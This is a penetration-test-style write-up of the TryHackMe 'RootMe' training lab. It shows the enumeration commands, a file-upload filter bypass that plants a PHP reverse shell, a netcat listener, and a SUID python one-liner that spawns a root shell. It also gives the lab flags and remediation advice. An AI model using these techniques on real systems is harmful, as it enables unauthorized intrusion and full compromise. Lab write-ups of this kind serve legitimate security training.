# Penetration Testing Report: TryHackMe – RootMe

**Target Environment:** Linux (`RootMe` - TryHackMe)

**Severity:** Critical

**CVSS v3.1 Score:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Methodology:** Network Reconnaissance, Web Application Enumeration, Unrestricted File Upload Exploitation, Reverse Shell Execution, and SUID Privilege Escalation.

---

## Executive Summary

A security assessment was performed on the target host `RootMe`. The assessment revealed two primary security vulnerabilities: an **Unrestricted File Upload** vulnerability on an unindexed web administration panel and an **Insecure SUID Permission Misconfiguration** on the system's Python interpreter.

Exploiting these issues enabled initial foothold execution as the low-privileged web server account (`www-data`) and subsequent privilege escalation to full root administrative authority (`root`).

---

## Scope & Service Enumeration

### 1. Network Scan (`Nmap`)

An initial service and version detection scan identified two active listening services:

```bash
nmap -sV -sC -Pn <TARGET_IP> -oN rootme_nmap.txt

```

* **Port 22/TCP:** OpenSSH 7.6p1 (Ubuntu)
* **Port 80/TCP:** Apache httpd 2.4.29 (Ubuntu)

---

### 2. Web Directory Discovery (`Gobuster`)

Directory brute-forcing against the HTTP web server was conducted to discover unlinked web interfaces:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt

```

**Discovered Paths:**

* `/uploads/` (Directory storing uploaded files)
* `/panel/` (Hidden administration/upload portal)

---

## Technical Exploitation Walkthrough

### 1. Initial Access via File Upload Abuse

Navigating to `http://<TARGET_IP>/panel/` revealed an unrestricted file upload interface. Standard `.php` file extensions were blocked by a client/server-side filter.

**Bypass & Shell Execution:**

1. A standard PHP reverse shell payload was modified with the local attacker IP address and listening port.
2. Extension filtering was bypassed by renaming the file extension to `.php5` (or `.phtml`).
3. A local Netcat listener was established:
```bash
nc -lvnp 1234

```


4. Navigating to `http://<TARGET_IP>/uploads/php_shell.php5` triggered code execution, yielding an initial interactive shell as `www-data`.

**User Flag Location:**

```bash
cat /var/www/user.txt

```

*(Flag: `THM{y0u_g0t_a_sh3ll}`)*

---

### 2. Privilege Escalation via SUID Binary (`Python`)

During local post-exploitation enumeration, a search for binaries containing the SUID (`Set Owner User ID upon execution`) permission bit was executed:

```bash
find / -type f -user root -perm -4000 2>/dev/null

```

**Anomalous Binary Found:**

`/usr/bin/python`

Because `/usr/bin/python` had the SUID bit set and was owned by `root`, arbitrary python code execution could spawn a process retaining effective `root` privileges.

**Root Shell Exploitation (GTFOBins Method):**

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

```

Running this command spawned a privileged shell:

```bash
whoami
# Output: root

```

**Root Flag Location:**

```bash
cat /root/root.txt

```

*(Flag: `THM{pr1v1l3g3_3sc4l4t10n}`)*

---

## Remediation & Mitigation

1. **Restrict Web File Uploads:** Implement strict server-side validation against file upload portals. Utilize explicit whitelist checking for permitted extensions (e.g., `.png`, `.jpg` only) rather than relying on blacklist filters, and disable execution permissions on the `/uploads/` directory.
2. **Audit SUID Permissions:** Strip unnecessary SUID bits from system binaries, specifically programming language interpreters like `/usr/bin/python` (`chmod u-s /usr/bin/python`), to maintain principle of least privilege.
